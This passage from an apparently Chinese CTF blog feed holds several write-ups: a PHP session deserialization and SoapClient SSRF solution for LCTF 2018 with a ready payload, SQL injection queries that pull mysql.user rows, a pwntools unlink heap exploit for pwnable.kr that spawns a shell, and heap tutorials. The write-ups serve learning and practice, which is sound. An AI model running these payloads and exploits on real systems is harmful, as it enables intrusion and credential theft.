class="line">if(isset($_GET[&apos;name&apos;]))&#123;</span><br><span class="line">    $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>没错，这是到 <code>SSRF</code>，怎么 <code>SSRF</code> 暂且不提。</p><p>先想想怎么利用：</p><ol><li>从 <code>flag.php</code> 可以看出把 <code>flag</code> 放到 <code>SESSION</code> 里了。</li><li><code>PHP</code> 里有个内置类可以访问 <code>Web</code>。</li></ol><p>我前面都铺垫了这么长了，所以这么玩：</p><p>通过 <code>session</code> 处理的差异反序列化 <code>某个类</code> 访问 <code>flag.php</code> 。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>那么某个类是哪个类：<code>SOAP</code></p><p><code>SOAP</code> 是什么。。怎么操作我就不详细解释了（我也不会）</p><p>飘零师傅会： <code>https://www.anquanke.com/post/id/153065#h2-5</code></p><p>这里给出利用代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &quot;http://127.0.0.1/flag.php&quot;;</span><br><span class="line">$attack = new SoapClient(null,array(</span><br><span class="line">&apos;location&apos; =&gt; $target,</span><br><span class="line">&apos;user_agent&apos;=&gt;&quot;niuniu^^Cookie: PHPSESSID=s5ndonmikgkcif6q28k0aptnf0^^Content-Type: text/html;charset=UTF-8^^^^&quot;,</span><br><span class="line">        &apos;uri&apos; =&gt; &quot;/&quot;</span><br><span class="line">));</span><br><span class="line">$attack = str_replace(&apos;^^&apos;,&quot;\n\r&quot;,serialize($attack));</span><br><span class="line">$payload = urlencode($attack);</span><br><span class="line">echo $payload;</span><br></pre></td></tr></table></figure></p><p>这里注意 str_replace 中使用的是 <code>\n\r</code> 而不是 <code>\r\n</code><br>输出出来的便是 <code>payload</code>。</p><h3 id="1-开启-php-serialize-模式"><a href="#1-开启-php-serialize-模式" class="headerlink" title="1. 开启 php_serialize 模式"></a>1. 开启 php_serialize 模式</h3><p>回顾一下题目的代码注意这一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($_GET[f],$_POST);</span><br></pre></td></tr></table></figure></p><p>我们将 f 设置为 <code>session_start</code>.<br>$_POST 是个天然的数组，所以 <code>POST</code> 数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure></p><p>可以在代码的最前面添加上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;f&apos;]=&quot;session_start&quot;;</span><br><span class="line">$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;;</span><br></pre></td></tr></table></figure></p><p>这样就相当于 <code>GET</code> 和 <code>POST</code> 传值了 （我没有 <code>hackbar</code> ，不想　<code>POST</code> 传啊）</p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>再看看这三行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;name&apos;]))&#123;</span><br><span class="line">    $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这不就是直接帮我们写进 <code>SESSION</code> 文件吗？<br>测试中发现 $_GET[‘name’] 不能写在代码中，所以还是老老实实的写在 <code>url</code> 里吧（在测试中遇到了个很奇怪的问题。。。）</p><p>所以最后参数分别是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;f&apos;] = &apos;session_start&apos;;</span><br><span class="line">$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;;</span><br><span class="line">$_GET[&apos;name&apos;] = &apos;|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A1%3A%22%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A95%3A%22niuniu%0A%0DCookie%3A+PHPSESSID%3Ds5ndonmikgkcif6q28k0aptnf0%0A%0DContent-Type%3A+text%2Fhtml%3Bcharset%3DUTF-8%0A%0D%0A%0D%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&apos;; // name 用 `url` 传递</span><br></pre></td></tr></table></figure><p>我们可以新开个文件并访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>会发现已经有我们的 <code>SOAP</code> 对象了。</p><p>接下来使用再调用一下对象就可以了，第二次调用的参数就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;f&apos;] = &apos;extract&apos;;</span><br><span class="line">$_POST[&apos;b&apos;]=&apos;call_user_func&apos;;</span><br></pre></td></tr></table></figure><p>就可以了。 <code>f</code> 的目的在于 将 <code>b</code> 覆盖成 <code>call_user_func</code>，在最后的：</p><p><code>call_user_func($b,$a);</code></p><p>就会执行 <code>SOAP</code> 了。</p><p>##结语</p><p>写到最后心态崩了。。前面分析 php 序列化还比较满意，写到 CTF 题时遇到了很多问题也没写好。。。所以还不如直接看参考中的 WP。</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/3336#toc-3（这题的" target="_blank" rel="noopener">https://xz.aliyun.com/t/3336#toc-3（这题的</a> WP）<br><a href="https://github.com/CTFTraining/lctf_2018_bestphp_s_revenge/tree/master/files/src（这里有源码）" target="_blank" rel="noopener">https://github.com/CTFTraining/lctf_2018_bestphp_s_revenge/tree/master/files/src（这里有源码）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;彩笔只能复现 :(&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;首先看看 &lt;code&gt;php&lt;/code&gt; 中 &lt;code&gt;SESSION&lt;
      
    
    </summary>
    
    
      <category term="web" scheme="https://liey1.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>sql 注入的一些小姿势</title>
    <link href="https://liey1.github.io/2018/11/11/sql%20%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%A7%BF%E5%8A%BF/"/>
    <id>https://liey1.github.io/2018/11/11/sql 注入的一些小姿势/</id>
    <published>2018-11-11T03:59:33.828Z</published>
    <updated>2018-11-11T06:38:32.142Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>利用已知列名爆 库名 和 表名</p></blockquote><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/10/bd4553ac40258d7a8082d9511cb556a2.png" alt="1"></p><p>可以发现必须要列名正确，类似的一共有：<br><code>polygon、multipoint、multilinestring、multipolygon、linestring</code></p><blockquote><p>用已知库名爆列名</p></blockquote><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/11/d2686fcb4006090280f11959ac83a98e.png" alt="2"></p><p>原理嘛。。。不是很清楚</p><p>语句：<br><code>and (select * from (select * from mysql.user a join mysql.user b using(Host,User))c);</code></p><blockquote><p>绕过列名爆数据</p></blockquote><p><code>select table_schema,table_name from information_schema.tables where table_name=&#39;session&#39; union select 1,(select h.2 from (select 1,2  union select user,host from mysql.user limit 1 offset 3 )h);</code></p><p>这里的关键应该在：</p><p><code>select h.2 from (select 1,2  union select user,host from mysql.user limit 1 offset 3 )h</code></p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/11/1385170f40be7831802ad8f0de4e2e51.png" alt="1"></p><p>可以发先列名变成了我们构造的，应该是因为 <code>union</code> 会使用 第一个 <code>select</code> 的语句作为列名。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;利用已知列名爆 库名 和 表名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://bmob-cdn-22342.b0.upaiyun.com/2018/11/10/bd4553ac40258d7a8082d9511cb55
      
    
    </summary>
    
    
      <category term="web" scheme="https://liey1.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出2 -- 从 ruozhi 的角度看 pwnable.kr 的 unlink</title>
    <link href="https://liey1.github.io/2018/10/28/%E4%BB%8Eruozhi%20%E7%9A%84%E8%A7%92%E5%BA%A6%E7%9C%8B%20pwnable%20%E7%9A%84%20unlink/"/>
    <id>https://liey1.github.io/2018/10/28/从ruozhi 的角度看 pwnable 的 unlink/</id>
    <published>2018-10-28T05:47:26.322Z</published>
    <updated>2018-10-28T05:56:23.072Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">来自 pwnable.kr 的一道特别的 unlink 题</a><br><a href="http://bmob-cdn-21459.b0.upaiyun.com/2018/10/28/85d256bc40e4074a80d83bc9160840e2.zip" target="_blank" rel="noopener">这题的程序</a></p><hr><p>首先先看看代码吧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">typedef struct tagOBJ&#123;</span><br><span class="line">struct tagOBJ* fd;</span><br><span class="line">struct tagOBJ* bk;</span><br><span class="line">char buf[8];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line">void shell()&#123;</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void unlink(OBJ* P)&#123;</span><br><span class="line">OBJ* BK;</span><br><span class="line">OBJ* FD;</span><br><span class="line">BK=P-&gt;bk;</span><br><span class="line">FD=P-&gt;fd;</span><br><span class="line">FD-&gt;bk=BK;</span><br><span class="line">BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">malloc(1024);</span><br><span class="line">OBJ* A = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">OBJ* B = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">OBJ* C = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line"></span><br><span class="line">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span><br><span class="line">A-&gt;fd = B;</span><br><span class="line">B-&gt;bk = A;</span><br><span class="line">B-&gt;fd = C;</span><br><span class="line">C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);</span><br><span class="line">printf(&quot;here is heap address leak: %p\n&quot;, A);</span><br><span class="line">printf(&quot;now that you have leaks, get shell!\n&quot;);</span><br><span class="line">// heap overflow!</span><br><span class="line">gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">// exploit this unlink!</span><br><span class="line">unlink(B);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><p>不是很长，很容易懂：</p><ol><li>自定了个类似 chunk 的结构</li><li>自定了个 unlink 函数（原 unlink 函数已经有保护了，所以利用不起来。）</li><li>申请了三个 chunk</li><li>gets 函数这里可以写任意长度的数据，可以覆盖 B 的 chunk</li><li>程序还有个 shell 函数，将 eip 指向此处即可，不需要写 shell 了。</li><li>这里泄露了 heap 和 stack 的地址</li></ol><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>现在最大的问题就是，将 <code>shell</code> 的地址写到哪里可以控制 <code>eip</code> ？</p><p>（此时无耻的翻一下 <code>WP</code>）</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>查看该程序的汇编代码：</p><p><code>objdump  -M intel -S unlink</code><br>翻到 main 函数的最后，可以注意到几句有意思的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">80485ff:8b 4d fc             mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">8048602:c9                   leave  </span><br><span class="line">8048603:8d 61 fc             lea    esp,[ecx-0x4]</span><br><span class="line">8048606:c3                   ret</span><br></pre></td></tr></table></figure><blockquote><p> ebp 的地址？</p></blockquote><ol><li>在这里把 [ecx-0x4] 的值给了 esp，然后调用了 ret，所以此处只要能控制 ecx-0x4 下的值，就可以控制 eip</li><li>ecx 又来自 ebp-0x4，但是程序已经泄露了 变量A 的地址了，我们可以通过 A 的地址偏移某个值得到 EBP，这个不是重点，所以在这里先说偏移量：EBP = A + 0x14。</li></ol><blockquote><p>将 shellcode 地址写在哪里？</p></blockquote><p>将上面的代码解析一下： *(*(ebp-4)-4) = shellcode地址。</p><p>所以地址 *(ebp-4)-4 下的内容我们也要控制。正好我们还有一块地址： 变量A 。</p><p>直接看 payload 吧：</p><p><code>shellcode_addr(1) + 填充(2) + （ 变量A + 8 +4）（3） + EBP-0x4（4）</code></p><ol><li><code>shellcode_addr</code> 可以通过程序获取到： <code>0x80484eb</code></li><li>填充是 （16-4） 个，（其实我觉得 buf 应该是 8 个字节，但是从调试看来 buf 好像有 16 个字节一样，可能是对齐？）</li><li>变量A 的地址指向的是 fd，但是 <code>shellcode_addr</code> 在 buf 处，所以要加上 8，又因为还要过会还要 -4 ，所以再加上 4 。</li><li>*(ebp-4) 处取的是 ebp-4 的位置，故 -4。</li></ol><p>ok，payload 构造完了，利用起来就可以了。</p><p>再说说怎么得到的 A 相对 EBP 的偏移量，我们幻想一下栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A &lt;=== 泄露地址</span><br><span class="line">B -0x4</span><br><span class="line">C -0x8</span><br><span class="line">EBP -0xC</span><br><span class="line">EIP -0x10</span><br></pre></td></tr></table></figure><p>这么计算起来 EBP 应该位于 A-0xC 处，但是实际上却是 0x14 除，中间多出来的 8 个字节我也不知道是啥，但是我们可以通过 gdb 调试的方式得到这个偏移（当然我一开始也是看的 WP）。</p><p>贴一下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./unlink&apos;)</span><br><span class="line">p.recvuntil(&apos;stack address leak: &apos;)</span><br><span class="line">stack_addr = p.recvuntil(&apos;\n&apos;)</span><br><span class="line">p.recvuntil(&apos;heap address leak: &apos;)</span><br><span class="line">heap_addr = p.recvuntil(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">stack_addr = int(stack_addr,16)</span><br><span class="line">heap_addr = int(heap_addr,16)</span><br><span class="line">shell_addr = 0x80484eb</span><br><span class="line">ebp = stack_addr + 0x14</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;stack : &quot;+ str(hex(stack_addr))</span><br><span class="line">print &quot;heap : &quot;+ str(hex(heap_addr))</span><br><span class="line"></span><br><span class="line">payload = p32(shell_addr) + &apos;a&apos;*12 + p32(heap_addr + 12) + p32(ebp-4)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;shell!&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://pwnable.kr/play.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;来自 pwnable.kr 的一道特别的 unlink 题&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://bmob-cdn-21459.b
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://liey1.github.io/tags/pwn/"/>
    
      <category term="heap" scheme="https://liey1.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出1 -- unlink</title>
    <link href="https://liey1.github.io/2018/10/27/heap_unlink/"/>
    <id>https://liey1.github.io/2018/10/27/heap_unlink/</id>
    <published>2018-10-27T14:31:10.074Z</published>
    <updated>2018-10-28T03:15:59.906Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/" target="_blank" rel="noopener">原文</a></p><p>照着这篇文章写的，不算翻译吧（毕竟我英文差的**）</p><h3 id="这篇文章将学习怎么使用-unlink-来进行堆溢出，先看看漏洞程序："><a href="#这篇文章将学习怎么使用-unlink-来进行堆溢出，先看看漏洞程序：" class="headerlink" title="这篇文章将学习怎么使用 unlink 来进行堆溢出，先看看漏洞程序："></a>这篇文章将学习怎么使用 unlink 来进行堆溢出，先看看漏洞程序：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/* </span><br><span class="line"> Heap overflow vulnerable program. </span><br><span class="line"> */</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main( int argc, char * argv[] )</span><br><span class="line">&#123;</span><br><span class="line">        char * first, * second;</span><br><span class="line"></span><br><span class="line">/*[1]*/ first = malloc( 666 );</span><br><span class="line">/*[2]*/ second = malloc( 12 );</span><br><span class="line">        if(argc!=1)</span><br><span class="line">/*[3]*/         strcpy( first, argv[1] );</span><br><span class="line">/*[4]*/ free( first );</span><br><span class="line">/*[5]*/ free( second );</span><br><span class="line">/*[6]*/ return( 0 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看看程序的 <code>[3]</code> 中做了什么：<br>    将 <code>argv[1]</code>  复制进堆块 <code>first</code> 中 且没有任何限制，因此当用户输入一个大于 <code>666</code> 字节就会覆盖下一个 <code>chunk</code> 。</p><p>首先分析下 <code>glibc malloc</code> 在 <code>free</code> 的时候都做了什么吧。</p><p>当输入的字节小于 666 字节时，在 <code>[4]</code> 中做了如下操作：</p><pre><code>1. 非 mmap 的 chunk，合并 前/后 的块2. 合并上一个块：    * 如果当前释放的 chunk 中的 P 位为 0，就将上一个块在 `bins` 中移除（ `unlink` 操作），将当前块的大小增加上上一个块的大小 并且 将当前块指向上一个块。    * 在这个例子中 P 位为 1（第一个块默认的 P 位都为 1，尽管上一个块不存在）。3. 合并下一个块：    * 当下一个块为 free 时，将下一个块从 bins 中移除（ 也是执行 `unlink`  ），将当前块的大小加上下一个块的大小。（在这里例子中下一个块为 second，所以也不会合并）    * 有意思的是，获取下一个块是否为 free 是根据下下个块的 P 位来决定的。4. 然后添加 合并后的块 到  unsorted bin 中。在这里例子中没有发生合并，所以只用将  first 添加到 unsorted bin 就好。</code></pre><p>下面说说攻击者在第三行中覆盖 second 这块内存的内容：</p><ul><li>prev_size = 覆盖成偶数（使 PREV_INUSE 位为 0）</li><li>size = -4</li><li>fd = free address -12</li><li>bk = shellcode address</li></ul><p>在攻击者的用向下，[4] 做了如下事：</p><ol><li>合并上下堆块</li><li>合并上一个块：和上面分析的一样，不再重复</li><li>合并下一个块：<br> 判断下一个块是否为空闲，前面提到过是根据下下个块的 P 位来判断的。那么怎么找到下下个块的地址呢？就是：下一个块的地址+下一个块大小。在这里我们把下一块的大小变成了-4，所以他 下一块的地址（prev_size）+（-4） 又指向了自己</li></ol><hr><p>回顾一下 unlink 的过程：</p><pre><code>1. 首先传入要 unlink 的堆块，假定变量 P2. BK = P-&gt;bk , FD = P-&gt;fd // 将 P 的 bk 和 fd 分别给 BK 和 FD 变量3. FD-&gt;bk = BK, BK-&gt;fd = FD（因为用文字太绕了。）4. //用文字描述就是：当前块的上一个块的下一个块（即：(P-&gt;bk)BK-&gt;fd） 等于 当前块的下一块。下一块的上一块同理。</code></pre><p>来张图比什么都清晰：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/10/27/18118dc040318ddb80925a647dcc57c0.png" alt="unlink过程图"> —此图来自 ctf-wiki</p><hr><p>回到上面，在 <code>[3]</code> 处覆盖了 <code>second</code> 堆块后：<br>此时 <code>second</code> 堆应该是这样的：</p><blockquote><p>second</p></blockquote><table><thead><tr><th>字段</th><th style="text-align:left">—–</th><th style="text-align:left">值</th></tr></thead><tbody><tr><td>prev_size</td><td style="text-align:left">—–</td><td style="text-align:left">偶数（最后一位为 P 位，只要是偶数最后一位就为 0，因此偶数即可）</td></tr><tr><td>size</td><td style="text-align:left">—–</td><td style="text-align:left">-4 （减去4，指向了自己）</td></tr><tr><td>fd</td><td style="text-align:left">—–</td><td style="text-align:left">GOT入口-12 （稍后解释）</td></tr><tr><td>bk</td><td style="text-align:left">—–</td><td style="text-align:left">shellcode 地址</td></tr></tbody></table><p><code>回顾一下代码的 [4]：free(first)</code></p><blockquote><p>执行这句话的时候发生了什么？</p></blockquote><ol><li>释放掉 first 块</li><li>判断上一个块是否空闲，在这里不是空闲的，所以跳过</li><li>判断下一个块是否空闲，在这里判断的是 second 块，原本应该是 非空闲 的，but 这里的 size 是 -4，所以取下下块的时候又跑到了自己块的 prev_size 处，这里的值是偶数，所以 P 位为0，所以就未占用咯，所以要合并咯，合并就要用到 unlink 咯。</li></ol><blockquote><p>那么在这里 unlink 都做了什么呢？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd （ FD = GOT入口-12 ）</span><br><span class="line">BK = P-&gt;bk （ BK = shellcode地址 ）</span><br><span class="line">FD-&gt;bk = BK（ FD-&gt;bk = GOT入口，因为 FD 是 GOT-12，bk 位于 FD 12个字节处，所以 FD-&gt;bk 就等于 FD+12 的地址 ）</span><br><span class="line">BK-&gt;fd = FD（这里是什么不重要了，但是此处的内容也会被破坏，所以要注意）</span><br></pre></td></tr></table></figure><p>在这里 GOT 入口表被覆盖成 shellcode 地址了。</p><p>这里覆盖 GOT 入口表本身没什么意义，只是一个思路吧，当作迈出去的第一步。</p><p>至此， unlink 的利用就算结束了，下篇文章分析一道，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while True:</span><br><span class="line">    print &quot;特别特别特别&quot;</span><br><span class="line">print &quot;简单的题目。&quot;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;照着这篇文章写的，不算
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>堆笔记1</title>
    <link href="https://liey1.github.io/2018/10/22/%E5%A0%86%E7%AC%94%E8%AE%B01/"/>
    <id>https://liey1.github.io/2018/10/22/堆笔记1/</id>
    <published>2018-10-21T16:48:41.864Z</published>
    <updated>2018-10-27T04:15:50.141Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-什么是-chunk"><a href="#1-什么是-chunk" class="headerlink" title="1. 什么是 chunk"></a>1. 什么是 chunk</h3><p>由 malloc 申请的内存称为 chunk</p><h3 id="2-chunk-结构"><a href="#2-chunk-结构" class="headerlink" title="2. chunk 结构"></a>2. chunk 结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize</span><br></pre></td></tr></table></figure><blockquote><p>chunk 字段解释</p></blockquote><p>prev_size ： 如果前一个chunk空闲，则该字段表示前一个chunk的大小。如果前一个chunk 非空闲状态，则此处作为前一个 chunk 的数据部分（即被前一个chunk使用）。</p><p>size ： 记录当前块的大小，必须为 2 * SIZE_T 的整数倍（SIZE_T 在32位为4，64位为8）该字段的低三位和大小没关系，分别为：</p><pre><code>1. NON_MAIN_ARENA 记录该 chunk 是否属于主线程2. IS_MAPPED  记录当前 chunk 是否由 mmap 分配3. PREV_INUSE 记录前一个 chunk 是否被分配（第一个被分配的 chunk 的 P位都会设置成 1，防止访问前面的非法内存）。当该位为 0 时，可以用 prev_size 字段获得上个 chunk 的大小和地址。也方便空闲块的合并</code></pre><p>fd： 如果该 chunk 被分配，从此处开始就是用户的数据，否则指向上一个空闲 chunk<br>bk： 指向上一个空闲的 chunk</p><p>fd_nextsize： 指向前一个与当前 chunk 大小不同的空闲块<br>bk_nextsize： 指向后一个与当前 chunk 大小不同的空闲块</p><h2 id="3-bins"><a href="#3-bins" class="headerlink" title="3. bins"></a>3. bins</h2><blockquote><p>什么是 bins</p></blockquote><p>用户释放掉的 <code>chunk</code> 不会立马归还给系统，而是程序保留管理着，这样下次再分配时无需系统调用，节省资源。</p><p>ptmalloc 将 chunk 分为四类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fast bins</span><br><span class="line">unsorted bins</span><br><span class="line">small bins</span><br><span class="line">large bins</span><br></pre></td></tr></table></figure></p><p>对于后三个 bins，ptmalloc 将他们分在同一个数组中，结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define NBINS 128</span><br><span class="line">/* Normal bins packed as described above */</span><br><span 